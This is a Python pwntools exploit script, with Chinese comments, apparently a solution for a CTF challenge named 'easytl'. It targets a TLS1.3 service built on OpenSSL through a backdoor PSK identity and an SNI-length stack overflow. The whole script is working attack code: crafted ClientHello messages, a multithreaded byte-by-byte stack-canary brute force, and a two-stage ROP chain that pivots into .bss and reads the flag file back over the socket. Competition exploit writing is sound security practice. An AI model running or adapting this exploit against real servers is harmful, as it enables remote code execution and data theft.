#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
easytl exploit (2026 强网杯)

思路（见题解第 2/3 节）：
  1. 服务是静态链接 OpenSSL 3.x 的 TLS1.3 "加密存储" 服务，ET_EXEC 非 PIE，
     所有 gadget / .bss 都是绝对地址，不需要任何泄漏。
  2. 漏洞在 info_cb 收到 alert 时调用的 0x40304d：
         char buf[0x50];
         memcpy(buf, cur_ptr, cur_len);   // 指针来自 psk_buf，长度来自 sni_len
     psk_buf 由 psk_find_session_callback（后门 identity
     1401518dc5d7641ccd41593a5d812410）写入，cur_len 由 SSL_CB_ACCEPT_LOOP
     事件写成 sni_len。
     因此 source = 攻击者完全可控的 PSK identity，length = 攻击者可控的 SNI 长度。
  3. 用 HRR 让服务端处理两次 ClientHello，把 "写长度"（CH1 的 loop 事件）与
     "填 psk_buf"（CH2 的 pre_shared_key）拆开：
        CH1: supported_groups=[0x1234, x25519], key_share=[0x1234] -> HelloRetryRequest
        CH2: key_share=[x25519] + 后门 identity 的 PSK -> binder 校验失败 -> alert -> 溢出
     CH1 与 CH2 的 SNI 必须逐字节相同，且 session_id 必须复用。
  4. canary 位于 buf+0x58。服务 accept 后 fork，所有子进程 canary 相同，
     sni_len = 0x58 + k 时只覆盖 canary 前 k 字节，可逐字节爆破。
     Oracle：命中的那一次在 alert 之后会多出一段裸写的 "error"
     （info_cb 里 write(fd, "error", 5)，不带 TLS 记录头）。
  5. 溢出链只有 255-0x68 = 151 字节，所以 stage1 只做
        read(4, BSS, 0x400) ; pop rsp ; ret -> BSS
     stage2 放在 .bss（0x979000），做 open("flag") / read(3,...) / write(4,...)。
     子进程 close(listen_fd) 后 3 号 fd 空着，open 返回 3，4 号是 socket。

本脚本按题解的逻辑与偏移编写，直接对靶机运行即可。
用法：
    python exp.py TARGET_HOST 1443
"""
import argparse
import concurrent.futures as cf
import os
import struct
import sys

from pwn import context, log, remote

context.log_level = 'info'

# ---------------------------------------------------------------- 常量（题解常量表）
PSK = b'1401518dc5d7641ccd41593a5d812410'      # 后门 PSK identity（32 字节）

POP_RAX = 0x5f6c9a
POP_RDI = 0x4251bd
POP_RSI = 0x5e9a79
POP_RDX = 0x52f0d2
POP_RSP = 0x4b9b60
SYSCALL = 0x76e706

BSS = 0x979000          # stage2 落点
PATH = 0x979300         # "flag\0"
FLAG = 0x979500         # flag 读入缓冲区（可以超出 read 的 0x400 窗口）

CANARY_OFF = 0x58       # canary 相对 buf 的偏移
RET_OFF = 0x68          # 返回地址相对 buf 的偏移
MAX_SNI = 0xFF          # OpenSSL 把 SNI 限制在 255 字节

p16 = lambda x: struct.pack('>H', x)
p32 = lambda x: struct.pack('>I', x)
p64 = lambda x: struct.pack('<Q', x)

DEFAULT_HOST = "TARGET_HOST"
DEFAULT_PORT = 1443


# ---------------------------------------------------------------- TLS 报文构造
def ext(t, data):
    return p16(t) + p16(len(data)) + data


def make_sni(n):
    """把长度 n 的 SNI 切成若干 <=63 字节的 label，拼成合法域名。"""
    out = b''
    while n > 63:
        out += b'a' * 63 + b'.'
        n -= 64
    return out + b'a' * n


def ch(sid, sni, idn=None, group=0x1234):
    """构造一个 ClientHello（含 HRR 需要的假 group 与可选的后门 PSK）。"""
    e = [
        ext(0x0000, p16(len(sni) + 3) + b'\x00' + p16(len(sni)) + sni),      # SNI
        ext(0x000a, p16(4) + p16(0x1234) + p16(0x001d)),                      # groups
        ext(0x000d, p16(4) + p16(0x0804) + p16(0x0403)),                      # sigalgs
        ext(0x002b, b'\x02\x03\x04'),                                         # TLS1.3
        ext(0x0033, p16(36) + p16(group) + p16(32) + os.urandom(32)),         # key_share
        ext(0x002d, b'\x01\x01'),                                             # psk modes
    ]
    if idn is not None:
        ent = p16(len(idn)) + idn + b'\x00' * 4          # identity + ticket_age
        bid = os.urandom(48)                             # binder 随便填，必然失败
        e.append(ext(0x0029, p16(len(ent)) + ent + p16(len(bid) + 2) + p16(len(bid)) + bid))

    body = (p16(0x0303) + os.urandom(32) + bytes([len(sid)]) + sid +
            p16(2) + p16(0x1302) + b'\x01\x00' +
            p16(sum(map(len, e))) + b''.join(e))
    return b'\x16\x03\x01' + p16(len(body) + 4) + b'\x01' + len(body).to_bytes(3, 'big') + body


def fire(host, port, idn, timeout=4.0):
    """CH1 -> 读 HelloRetryRequest -> CH2。返回已经发出 CH2 的连接。"""
    io = remote(host, port, timeout=timeout)
    sid = os.urandom(32)
    sni = make_sni(len(idn))

    io.send(ch(sid, sni))
    hdr = io.recvn(5)
    n = struct.unpack('>H', hdr[3:5])[0]
    io.recvn(n)                       # HRR 的 ServerHello 记录体

    io.send(ch(sid, sni, idn, 0x001d))   # 复用 session_id，key_share 换成 x25519
    return io


def oracle(host, port, ln, guess, timeout=3.0):
    """
    单次判定：sni_len = ln（= 0x58 + k），identity[0x58:0x58+k] = guess。
    命中 -> info_cb 在 alert 之后裸写 "error"；失败 -> stack_chk_fail/abort。
    """
    idn = bytearray(b'A' * (ln - 33))
    idn[CANARY_OFF - 33:CANARY_OFF - 33 + len(guess)] = guess
    payload = PSK + b'\x00' + bytes(idn)

    try:
        io = fire(host, port, payload, timeout)
    except Exception:
        return False

    data = b''
    try:
        while True:
            chunk = io.recv(timeout=0.8)
            if not chunk:
                break
            data += chunk
    except EOFError:
        pass
    finally:
        io.close()

    # write(fd, "error", 5) 是裸写，一定落在所有 TLS 记录之后
    return data.endswith(b'error')


def brute_canary(host, port, workers=32):
    """canary 第 0 字节恒为 0x00，从第 2 字节开始爆破。"""
    canary = b'\x00'
    for k in range(1, 8):
        ln = CANARY_OFF + k
        found = None

        def try_byte(b):
            try:
                if oracle(host, port, ln, canary + bytes([b])):
                    return b
            except Exception:
                pass
            return None

        with cf.ThreadPoolExecutor(max_workers=workers) as pool:
            futs = [pool.submit(try_byte, b) for b in range(256)]
            for f in cf.as_completed(futs):
                r = f.result()
                if r is not None and found is None:
                    found = r
                    break
            for f in futs:
                f.cancel()

        if found is None:
            raise RuntimeError("canary byte %d not recovered" % k)
        canary += bytes([found])
        log.success("canary[%d] = 0x%02x  (%s)" % (k, found, canary.hex()))
    return canary


# ---------------------------------------------------------------- ROP
def stage2_blob(path=b'flag'):
    """
    stage2 布局（相对 BSS=0x979000）：
        0x000  指令链
        0x300  path
        0x500  flag 缓冲区
    open 返回 fd 3（listen fd 已被 close），read(3, FLAG, 0x100)，
    write(4, FLAG, 0x100) 直接回 socket。
    """
    chain = []
    # open(path, O_RDONLY)
    chain += [POP_RDI, PATH, POP_RSI, 0, POP_RDX, 0, POP_RAX, 2, SYSCALL]
    # read(3, FLAG, 0x100)
    chain += [POP_RDI, 3, POP_RSI, FLAG, POP_RDX, 0x100, POP_RAX, 0, SYSCALL]
    # write(4, FLAG, 0x100)
    chain += [POP_RDI, 4, POP_RSI, FLAG, POP_RDX, 0x100, POP_RAX, 1, SYSCALL]
    # exit(0)
    chain += [POP_RDI, 0, POP_RAX, 60, SYSCALL]

    blob = bytearray(b'\x00' * 0x400)
    for i, v in enumerate(chain):
        blob[8 * i:8 * i + 8] = p64(v)
    blob[PATH - BSS:PATH - BSS + len(path) + 1] = path + b'\x00'
    return bytes(blob)


def build_final(canary):
    """255 字节的 identity：stage1 做 read(4, BSS, 0x400) 后 pivot 到 .bss。"""
    stage1 = [
        POP_RDI, 4,
        POP_RSI, BSS,
        POP_RDX, 0x400,
        POP_RAX, 0,          # read
        SYSCALL,
        POP_RSP, BSS,
    ]
    assert len(stage1) == 11 and len(stage1) * 8 <= MAX_SNI - RET_OFF

    buf = bytearray()
    buf += PSK                       # 0x00 .. 0x1f
    buf += b'\x00'                   # 0x20 保证 strlen(identity) == 32
    buf += b'A' * (CANARY_OFF - len(buf))
    buf += canary                    # 0x58 .. 0x5f
    buf += p64(0xdeadbeefdeadbeef)   # 0x60 saved rbp，leave 时被弹掉
    for v in stage1:                 # 0x68 起
        buf += p64(v)
    if len(buf) > MAX_SNI:
        raise RuntimeError("stage1 too large for SNI")
    buf += b'B' * (MAX_SNI - len(buf))
    return bytes(buf)


def exploit(host, port):
    log.info("brute forcing stack canary (fork server, canary is stable)")
    canary = brute_canary(host, port)
    log.success("canary = %s" % canary.hex())

    idn = build_final(canary)
    assert len(idn) == MAX_SNI

    io = fire(host, port, idn, timeout=4.0)
    # 立刻把 stage2 塞进 socket：服务端还在处理 CH2，数据先排队，stage1 的
    # read(4, BSS, 0x400) 会把它读进 .bss，随后 pop rsp; ret 切入。
    io.send(stage2_blob(b'flag'))

    data = b''
    try:
        while True:
            chunk = io.recv(timeout=5)
            if not chunk:
                break
            data += chunk
            if b'flag{' in data and b'}' in data[data.index(b'flag{'):]:
                break
    except EOFError:
        pass
    io.close()
    return data


def main():
    ap = argparse.ArgumentParser(description="easytl exploit")
    ap.add_argument("host", nargs="?", default=DEFAULT_HOST)
    ap.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    args = ap.parse_args()

    out = exploit(args.host, args.port)

    idx = out.find(b'flag{')
    if idx >= 0:
        end = out.find(b'}', idx)
        print("[+] FLAG:", out[idx:end + 1].decode('latin-1'))
    else:
        print("[*] raw output (%d bytes):" % len(out))
        print(repr(out[-2048:]))


if __name__ == "__main__":
    main()
